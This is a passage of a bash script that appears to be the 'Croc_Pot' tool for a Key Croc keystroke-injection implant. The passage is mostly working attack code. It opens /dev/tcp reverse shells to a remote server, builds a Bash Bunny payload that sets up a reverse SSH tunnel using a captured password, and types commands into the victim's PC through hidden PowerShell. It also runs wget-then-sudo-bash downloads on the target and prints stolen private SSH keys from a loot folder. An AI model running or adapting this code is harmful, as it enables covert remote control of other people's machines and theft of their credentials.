		sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
	else
		ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
	fi
}
	case $(OS_CHECK) in
	WINDOWS)
		start_ssh ;;
	LINUX)
		start_ssh ;;
	MACOS)
		echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
	*)
		echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
	esac
else
	echo -ne "\t$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
fi
}
##
#----SSH Reachable target on local network
##
reachable_target() {
	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
	unset -f ping_alert && killall tcpdump 2> /dev/null
	for i in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$i >/dev/null && echo "$t_ip$i" &) ; done
	ip n | grep -i reach | sed -r 's/\b(dev|lladdr)\b//g'
}
##
#----SSH enter user/ip to start ssh
##
userinput_ssh() {
	read_all ENTER THE HOST NAME FOR SSH AND PRESS [ENTER] ; SSH_USER=${r_a}
	read_all ENTER THE IP FOR SSH AND PRESS [ENTER] ; SSH_IP=${r_a}
	ssh -o "StrictHostKeyChecking no" ${SSH_USER}@${SSH_IP}
}
##
#----SSH wifi pineapple menu/function
##
ssh_pineapple() {
	echo -ne "$(Info_Screen '
-Wi-Fi Pineapple Mk7 example/preset command')\n\n"
unset -f ping_alert && killall tcpdump 2> /dev/null
ping -q -c 1 -w 1 mk7 &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	echo -ne "$(ColorRed 'Did not detect Wi-Fi Pineapple Mk7')\n"
elif [[ "${#args[@]}" -eq 0 ]]; then
##
#----SSH Wi-Fi Pineapple Mk7 kismet LED lights random/off/reset/custom
##
pineapple_led() {
	clear
	echo -ne "$(Info_Screen '
-Wi-Fi Pineapple Mk7 Kismet LED example command
-Kismet LED Mod command--> LEDMK7 --help
-Reset color command--> LEDMK7 -r
-Trun LED off command--> LEDMK7 -0 0,0,0 -1 0,0,0 -2 0,0,0 -3 0,0,0
-Each LED is set to a Hue color 0-360, Saturation 0-255, and brightness 0-255
-More info at https://www.kismetwireless.net/mk7-led-mod')\n\n"
##
#----SSH Wi-Fi Pineapple Mk7 kismet led random light
##
kismet_ramdom() {
	read_all RANDOM MK7 KISMET LED LIGHT Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		Countdown 1 15 & for i in {1..10}; do ssh root@mk7 LEDMK7 -a $(( $RANDOM % 360 )),$(( $RANDOM % 255 )) -b $(( $RANDOM % 360 )),$(( $RANDOM % 255 )); sleep 5; ssh root@mk7 LEDMK7 -r; sleep 1; done
		ssh root@mk7 LEDMK7 -r
		Countdown 1 15 & for i in {1..10}; do ssh root@mk7 LEDMK7 -p $(( $RANDOM % 360 )),$(( $RANDOM % 255 )),$(( $RANDOM % 255 )); sleep 5; ssh root@mk7 LEDMK7 -r; sleep 1; done
		ssh root@mk7 LEDMK7 -r
		Countdown 1 15 & for i in {1..10}; do ssh root@mk7 LEDMK7 -0 $(( $RANDOM % 360 )),$(( $RANDOM % 255 )),$(( $RANDOM % 255 )) -1 $(( $RANDOM % 255 )),$(( $RANDOM % 255 )),$(( $RANDOM % 255 )) -2 $(( $RANDOM % 255 )),$(( $RANDOM % 255 )),$(( $RANDOM % 255 )) -3 $(( $RANDOM % 255 )),$(( $RANDOM % 255 )),$(( $RANDOM % 255 )); sleep 5; ssh root@mk7 LEDMK7 -r; sleep 1; done
		ssh root@mk7 LEDMK7 -r ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; pineapple_led ;;
	esac
}
##
#----SSH Wi-Fi Pineapple Mk7 kismet LED lights custom
##
kismet_custom() {
	read_all ENTER FIRST COLOR CODE AND PRESS [ENTER] ; local first_color=${r_a}
	read_all ENTER FIRST BRIGHTNESS CODE AND PRESS [ENTER] ; local first_bright=${r_a}
	read_all ENTER SECOND COLOR CODE AND PRESS [ENTER] ; local second_color=${r_a}
	read_all ENTER SECOND BRIGHTNESS CODE AND PRESS [ENTER] ; local second_bright=${r_a}
	ssh root@mk7 LEDMK7 -a ${first_color},${first_bright} -b ${second_color},${second_bright}
}
##
#----SSH wifi pineapple kismet led mod menu
##
MenuTitle MK7 KISMET LED MOD MENU ; MenuColor 19 1 RANDOM LED ; MenuColor 19 2 RESTORE LED ; MenuColor 19 3 TRUN OFF LED ; MenuColor 19 4 CUSTOM LED
MenuColor 19 5 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) kismet_ramdom ; pineapple_led ;; 2) ssh root@mk7 LEDMK7 -r ; pineapple_led ;; 3) ssh root@mk7 LEDMK7 -0 0,0,0 -1 0,0,0 -2 0,0,0 -3 0,0,0 ; pineapple_led ;;
	4) kismet_custom ; pineapple_led ;; 5) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) ssh_pineapple ;;
	*) invalid_entry ; ssh root@mk7 LEDMK7 -0 0,0,0 -1 0,0,0 -2 0,0,0 -3 0,0,0 ; pineapple_led ;;
	esac
}
##
#----SSH wifi pineapple menu
##
MenuTitle WIFI PINEAPPLE MENU ; MenuColor 19 1 SSH PINEAPPLE ; MenuColor 19 2 PINEAPPLE WEB ; MenuColor 19 3 MK7 LED MOD MENU ; MenuColor 19 4 MK7 STATUS/INFO
MenuColor 19 5 MK7 TCPDUMP ; MenuColor 19 6 ENTER COMMAND ; MenuColor 19 7 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) ip_check_ssh mk7 172.16.42.1 ; ssh_menu ;;
	2) start_web http://172.16.42.1:1471 ; ssh_menu ;;
	3) pineapple_led ;;
	4) ssh root@mk7 'uname -a ; uptime' ; echo ${LINE} ; ssh root@mk7 ifconfig ; echo ${LINE} ; ssh root@mk7 netstat -tunlp ; echo ${LINE} ; ssh root@mk7 ps -aux ; echo ${LINE}
	ssh root@mk7 iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort ; sleep 2 ; echo ${LINE}
	ssh root@mk7 nmap -Pn -sS -T 3 172.16.42.1/24 ; echo ${LINE} ; ssh_pineapple ;;
	5) ssh root@mk7 tcpdump -XX -i any ; ssh_pineapple ;;
	6) read_all ENTER COMMAND AND PRESS [ENTER] ; local USER_COMMAND=${r_a}
	ssh root@mk7 ''${USER_COMMAND}'' ; sleep 5 ; ssh_pineapple ;;
	7) main_menu ;;
	0) exit 0 ;;
	[bB]) ssh_menu ;; [pP]) Panic_button ;;
	*) invalid_entry ; ssh_pineapple ;;
	esac
fi
}
##
#----SSH to packet squirrel
##
ssh_squirrel() {
	ip_check_ssh squirrel 172.16.32.1
}
##
#----SSH to lan turtle
##
ssh_turtle() {
	local TURTLE_IP=/root/udisk/tools/Croc_Pot/turtle_mac.txt
if [ -e ${TURTLE_IP} ]; then
	if [[ "$(sed -n '1p' ${TURTLE_IP})" =~ ${validate_ip} ]]; then
		ip_check_ssh $(sed -n '1p' ${TURTLE_IP}) turtle
	else
		ip_check_ssh turtle 172.16.84.1
	fi
fi 2> /dev/null
}
##
#----SSH to signal owl
##
ssh_owl() {
	ip_check_ssh ${IP_O} 172.16.56.1
}
##
#----SSH to shark jack
##
ssh_shark() {
	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
if [ -e ${SHARK_IP} ]; then
	if [[ "$(sed -n '1p' ${SHARK_IP})" =~ ${validate_ip} ]]; then
		ip_check_ssh $(sed -n '1p' ${SHARK_IP}) shark
	else
		ip_check_ssh shark 172.16.24.1
	fi
fi 2> /dev/null
}
##
#----SSH to bash bunny
##
ssh_bunny() {
	clear
	echo -ne "$(Info_Screen '
-Start ssh with Target PC to Bash bunny or
-Start REVERSE SHELL Tunnel with keycroc to bash bunny
-Will need a small payload install on bash bunny
-This will create the payload for the bash bunny and save it to tools folder
-Place this in one of the bunny payloads switchs folder this is need for
reverse shell tunnel From bunny to keycroc
-Ensure bash bunny is connected to target pc
-Ensure bash bunny has internet connection
-Recommend to setup public and private keys on both bunny & Croc')\n\n"
	local bunny_payload=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell
	local bunny_payload_v=/root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt
##
#----Connect bunny to target pc network linux only
##
if [ "$(OS_CHECK)" = LINUX ]; then
	read_all CONNECT BUNNY TO TARGET PC NETWORK Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		case $HOST_CHECK in
		raspberrypi)
			Q CONTROL-ALT-t ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
			Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
			Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
			Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
		$HOST_CHECK)
			Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
			Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
			Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
			Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
		*)
			Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "i=\$(whoami)" ; Q ENTER ; Q STRING "if [ -e /home/\${i}/bb.sh ]; then"
			Q ENTER ; Q STRING "echo \"bb.sh is installed\"" ; Q ENTER ; Q STRING "else" ; Q ENTER ; Q STRING "echo \"installing bb.sh\"" ; Q ENTER
			Q STRING "wget bashbunny.com/bb.sh" ; Q ENTER ; Q STRING "fi" ; Q ENTER ; sleep 2 ; Q STRING "sudo bash ./bb.sh" ; Q ENTER ; sleep 3
			Q STRING "c" ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
		esac ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; ssh_bunny ;;
	esac
fi
##
#----bunny create reverse shell payload for keycroc
##
if [ -d "${bunny_payload}" ]; then
	LED B
else
	mkdir -p ${bunny_payload}
fi
if [ -e "${bunny_payload_v}" ]; then
	cat ${bunny_payload_v}
	echo -ne "\n${green}Reverse shell payload already exists check tools/Bunny_Payload_Shell folder${clear}\n"
	read_all KEEP THIS SETUP Y/N AND PRESS [ENTER]
	case $r_a in
		[yY] | [yY][eE][sS])
	echo -ne "\n$(ColorGreen 'Keeping existing Bunny_Payload_Shell')\n" ;;
		[nN] | [nN][oO])
		rm ${bunny_payload_v}
	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc, check for sshpass\n# Author:        Spywill\n# Version:       1.1
# Category:      Bash Bunny\n#\n#ATTACKMODE HID RNDIS_ETHERNET\n#ATTACKMODE HID ECM_ETHERNET\nATTACKMODE HID AUTO_ETHERNET\nsleep 30\nLED SETUP\nGET TARGET_HOSTNAME && echo \"\$TARGET_HOSTNAME\" > /tmp/OS.txt\n\nGET TARGET_OS && echo \"\$TARGET_OS\" >> /tmp/OS.txt\nLED B\nsleep 1
until wget -q --spider http://google.com; do\n	LED R\n	sleep 1\ndone\nLED G\nstatus=\"\$(dpkg-query -W --showformat='\${db:Status-Status}' sshpass 2>&1)\"\nif [ ! \$? = 0 ] || [ ! \"\$status\" = installed ]; then\n	LED SETUP\n	apt -y install sshpass\n	LED G\nelse\n	LED G\nfi
until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7000:localhost:22 -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) 2> /dev/null; do\n	LED R\n	sleep 1\ndone\nLED ATTACK" | tee ${bunny_payload_v}
		echo -ne "\n${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder${clear}\n" ;;
		*)
			invalid_entry ; ssh_bunny ;;
	esac
else
	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc, check for sshpass\n# Author:        Spywill\n# Version:       1.1
# Category:      Bash Bunny\n#\n#ATTACKMODE HID RNDIS_ETHERNET\n#ATTACKMODE HID ECM_ETHERNET\nATTACKMODE HID AUTO_ETHERNET\nsleep 30\nLED SETUP\nGET TARGET_HOSTNAME && echo \"\$TARGET_HOSTNAME\" > /tmp/OS.txt\n\nGET TARGET_OS && echo \"\$TARGET_OS\" >> /tmp/OS.txt\nLED B\nsleep 1
until wget -q --spider http://google.com; do\n	LED R\n	sleep 1\ndone\nLED G\nstatus=\"\$(dpkg-query -W --showformat='\${db:Status-Status}' sshpass 2>&1)\"\nif [ ! \$? = 0 ] || [ ! \"\$status\" = installed ]; then\n	LED SETUP\n	apt -y install sshpass\n	LED G\nelse\n	LED G\nfi
until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7000:localhost:22 -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) 2> /dev/null; do\n	LED R\n	sleep 1\ndone\nLED ATTACK" | tee ${bunny_payload_v}
	echo -ne "\n${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder${clear}\n"
fi
##
#----bunny start ssh session with target pc to bash bunny
##
read_all START SSH WITH TARGET PC TO BUNNY Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER BASH BUNNY PASSWORD AND PRESS [ENTER]
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "${r_a}" ; Q ENTER
	else
		case $HOST_CHECK in
		raspberrypi)
			Q CONTROL-ALT-t ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "${r_a}" ; Q ENTER ;;
		$HOST_CHECK)
			Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "${r_a}" ; Q ENTER ;;
		*)
			Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "ssh root@172.16.64.1" ; Q ENTER ; sleep 2 ; Q STRING "${r_a}" ; Q ENTER ;;
		esac
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; ssh_bunny ;;
esac
##
#----bunny start reverse shell bunny to keycroc
##
read_all START REVERSE TUNNEL WITH BUNNY TO CROC Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	if [[ $(ssh -o "StrictHostKeyChecking no" -o ConnectTimeout=5 root@localhost -p 7000 'echo ok' | sed 's/\r//g') = "ok" ]]; then
		LED ATTACK
		ssh -o "StrictHostKeyChecking no" root@localhost -p 7000 'echo -ne "\n${yellow}BASH BUNNY OS DETECTION: $(sed -n 2p /tmp/OS.txt)\nTARGET HOSTNAME: $(sed -n 1p /tmp/OS.txt)\n"'
		ssh root@localhost -p 7000
	else
		echo -ne "${red}Failed to make connection${clear}"
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; ssh_bunny ;;
esac
}
##
#----SSH Create and view public/private keys and copy to remote-host
##
ssh_keygen() {
	if [[ ${r_c} = 1 ]]; then
		sleep 0.1 ; unset r_c
	else
		clear
	fi
	echo -ne "$(Info_Screen '
Perform SSH Login Without Password Using ssh-keygen & ssh-copy-id

[G]-Generate public/private keys using ssh-key-gen on local-host
[S]-Send keys to remote-host using ssh-copy-id
[V]-View target/keycroc public/private and known_hosts keys
[N]-Return back to menu

Example: ssh-copy-id -i ~/.ssh/id_rsa.pub username@remote-host-ip
-remote-host can be pineapple,server,pc,etc')\n\n"
read_all [G]-GENERATE [S]-SEND [V]-VIEW [N]-NONE PRESS [ENTER]
case $r_a in
[gG])
	ssh-keygen
	read_all SEND KEYS TO REMOTE-HOST Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		read_all ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]
		ssh-copy-id -i ~/.ssh/id_rsa.pub ${r_a} ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; ssh_keygen ;;
	esac ;;
[sS])
	if [ -f /root/.ssh/*.pub ]; then
		read_all ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]
		ssh-copy-id -i ~/.ssh/id_rsa.pub ${r_a}
	else
		echo -ne "\n${yellow}Need to Generate public/private keys first${clear}\n"
		ssh-keygen
		read_all ENTER USER-NAME@REMOTE-HOST-IP AND PRESS [ENTER]
		ssh-copy-id -i ~/.ssh/id_rsa.pub ${r_a}
	fi ;;
[vV])
##
#----SSH view target public/private and known_hosts keys
##
	if [ -f `find /root/udisk/loot/Croc_Pot/SSH -type f -name "*.pub"` ]; then
		echo -ne "${yellow}Target public Keys:${clear}\n" ; cat `find /root/udisk/loot/Croc_Pot/SSH -type f -name "*.pub"`
	else
		echo -ne "\n${red}Unable to locate Target public/private Keys\nRun Croc_Pot_Payload.txt to retrieve target public/private keys${clear}\n"
	fi
ssh_f=$(echo `find /root/udisk/loot/Croc_Pot/SSH -type f -name "*.pub"` | sed 's/\.[^.]*$//')
	if [ -f ${ssh_f} ]; then
		echo -ne "\n${yellow}Target private Keys:${clear}\n" ; cat ${ssh_f}
	fi
	if [ -f "/root/udisk/loot/Croc_Pot/SSH/known_hosts" ]; then
		echo -ne "\n${yellow}Target known_hosts Keys:${clear}\n" ; cat /root/udisk/loot/Croc_Pot/SSH/known_hosts
	fi
##
#----SSH view keycroc public/private and known_hosts keys
##
	if [ -f `find /root/.ssh -type f -name "*.pub"` ]; then
		echo -ne "\n${yellow}Keycroc public Keys:${clear}\n" ; cat `find /root/.ssh -type f -name "*.pub"`
	else
		echo -ne "\n${red}Unable to locate Keycroc public/private Keys\nRun [G]-Generate to Create public/private keys${clear}\n"
	fi
ssh_f=$(echo `find /root/.ssh -type f -name "*.pub"` | sed 's/\.[^.]*$//')
	if [ -f ${ssh_f} ]; then
		echo -ne "\n${yellow}Keycroc private Keys:${clear}\n" ; cat ${ssh_f}
	fi
	if [ -f "/root/.ssh/known_hosts" ]; then
		echo -ne "\n${yellow}Keycroc known_hosts Keys:${clear}\n" ; cat /root/.ssh/known_hosts
	fi ; r_c=1 ; ssh_keygen ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; ssh_keygen ;;
esac
}
##
#----SSH reverse shell user input
##
croc_reverse_shell() {
	clear
	echo -ne "$(Info_Screen '
# 1 Start reverse shell with nc start listening on remote-server first
# 2 Start listening on the keycroc
# 3 Start reverse ssh tunnel target pc to KeyCroc
# 4 Start reverse ssh tunnel Keycroc to remote-server
# 5 Send remote commands with ssh
# 6 Send remote files with SCP')\n\n"
shell_input() {
	unset IP_RS IP_RSP IP_RSN
	rm /root/udisk/tools/Croc_Pot/saved_shell.txt 2> /dev/null
	read_all ENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER] ; IP_RS=${r_a} ; echo "${IP_RS}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
	read_all ENTER PORT NUMBER TO USE PRESS [ENTER] ; IP_RSP=${r_a} ; echo "${IP_RSP}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
	read_all ENTER SERVER/REMOTE-HOST NAME PRESS [ENTER] ; IP_RSN=${r_a} ; echo "${IP_RSN}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
}
##
#----SSH reverse with netcat remote listener on (server)
##
remote_listener() {
	clear
	echo -ne "$(Info_Screen '
-Start a reverse shell with netcat on keycroc
-Remotely access keycroc from a remote-server
-First On the listening remote-server enter this below
-->nc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER
-On Keycroc Enter ip of the listening remote-server and port number
-Keycroc side will be setup as below
-->/bin/bash -i >& /dev/tcp/remote-server-ip/port#')\n"
read_all START REVERSE SHELL Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
	if [ -e "${SAVE_SHELL}" ]; then
		echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 3p ${SAVE_SHELL}) Server user name\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
		read_all SAVED SHELL USE THEM Y/N AND PRESS [ENTER]
		case $r_a in
		[yY] | [yY][eE][sS])
			echo -ne "\n${yellow}LISTENING SERVER SETUP ${green}nc -lnvp $(sed -n 2p ${SAVE_SHELL}) -s $(sed -n 1p ${SAVE_SHELL})${clear}\n"
			/bin/bash -i >& /dev/tcp/$(sed -n 1p ${SAVE_SHELL})/$(sed -n 2p ${SAVE_SHELL}) 0>&1 & ;;
		[nN] | [nN][oO])
			shell_input
			echo -ne "\n${yellow}LISTENING SERVER SETUP ${green}nc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
			/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 & ;;
		*)
			invalid_entry ; croc_reverse_shell ;;
		esac
	else
		echo -ne "$(ColorRed 'Did not find any saved shell setup')\n"
		shell_input
		echo -ne "\n${yellow}LISTENING SERVER SETUP ${green}nc -lnvp ${IP_RSP} -s ${IP_RS}${clear}\n"
		/bin/bash -i >& /dev/tcp/${IP_RS}/${IP_RSP} 0>&1 &
	fi ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; croc_reverse_shell ;;
esac
}
##
#----SSH keycroc as listener
##
croc_listener() {
	clear
	echo -ne "$(Info_Screen '
-Start Listening on keycroc
-Access on remote PC,server
-This will start listening on the keycroc
-Enter this below on remote-server/host side
-/bin/bash -i >& /dev/tcp/IP/7000 0>&1 &')\n\n"
read_all START LISTENING ON CROC Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	clear
	echo -ne "\n${yellow}ON REMOTE PC/SERVER SETUP ${green}/bin/bash -i >& /dev/tcp/$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)/7000 0>&1${clear}\n"
	nc -lnvp 7000 -s $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; croc_reverse_shell ;;
esac
}
##
#----SSH reverse ssh tunnle with target pc to keycroc
##
shell_pc() {
	clear
	echo -ne "$(Info_Screen '
-Start reverse ssh tunnel Target PC to Keycroc
-PC side will be setup with this below
-->ssh -fN -R port#:localhost:22 root@keycroc IP
-Keycroc side will be setup with this below
-->ssh PC-username@localhost -p port#')\n"
	echo -ne "$(ColorYellow 'Found save Passwd try this:') $(target_pw)\n"
start_shell() {
if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a}
else
	ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p ${r_a}
fi
}
if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
	read_all START REVERSE SSH TUNNEL TARGET PC TO KEYCROC Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		read_all ENTER PORT NUMBER TO BE USE AND PRESS [ENTER]
		if [ "$(OS_CHECK)" = WINDOWS ]; then
			Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass" ; Q ENTER ; sleep 3
			Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
			Q ENTER ; sleep 3 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ; start_shell
		else
			case $HOST_CHECK in
			raspberrypi)
				Q CONTROL-ALT-t ; sleep 1
				Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
				Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
			$HOST_CHECK)
				Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1
				Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
				Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
			*)
				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1
				Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
				Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q ALT-TAB ; start_shell ;;
			esac
		fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; shell_pc ;;
	esac
else
	echo -ne "\t$(ColorYellow 'PLEASE RUN CROC_POT_PAYLOAD.TXT TO GET TARGET IP/USERNAME')\n"
fi
}
##
#----SSH start a Reverse SSH Tunnel Keycroc to virtual private server (VPS)
##
ssh_tunnel() {
	local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
	echo -ne "$(Info_Screen '
-Start a Reverse SSH Tunnel Keycroc to virtual private server (VPS)
-Remotely access keycroc from VPS or SSH to VPS
-Keycroc will be setup with these setting below:
-\e[40;32mssh -fN -R port#:localhost:22 root@remote-server-ip\e[0m\e[40;93m                            
-ON VPS side enter this below:
-\e[40;32mssh root@localhost -p port#                                                    ')\n\n"
start_tunnel() {
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 $(sed -n 1p ${SAVE_SHELL}) &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	echo -ne "${red}Unable to reach VPS ${clear}$(sed -n 1p ${SAVE_SHELL})\n"
	ssh_tunnel
elif [[ "${#args[@]}" -eq 0 ]]; then
	echo -ne "\n${yellow}Keycroc SETUP ${green}ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
	echo -ne "\n${yellow}VPS SETUP ${green}ssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
	ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})
fi
}
##
#----Start SSH session with vps
##
ssh_vps() {
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -q -c 1 -w 1 $(sed -n 1p ${SAVE_SHELL}) &>/dev/null 2>&1
if [[ $? -ne 0 ]]; then
	echo -ne "${red}Unable to start ssh on VPS ${clear}$(sed -n 1p ${SAVE_SHELL})\n"
	ssh_tunnel
elif [[ "${#args[@]}" -eq 0 ]]; then
	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})
fi
}
vps_info() {
	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL}) 'uptime ; 'echo ${LINE}' ; uname --all ; 'echo ${LINE}' ; cat /proc/version ; 'echo ${LINE}' ; ifconfig ; 'echo ${LINE}' ; last -a | head -3 ; 'echo ${LINE}' ; service --status-all ; 'echo ${LINE}''
